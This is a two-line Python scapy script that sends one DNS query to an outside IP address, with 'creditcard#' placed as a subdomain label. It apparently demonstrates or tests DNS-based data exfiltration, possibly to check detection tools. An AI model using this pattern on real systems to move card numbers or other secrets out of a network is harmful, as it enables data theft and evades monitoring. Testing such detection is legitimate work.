from scapy.all import *
sr1(IP(dst="161.35.120.249")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="creditcard#.notusedforexfil.com")),verbose=1)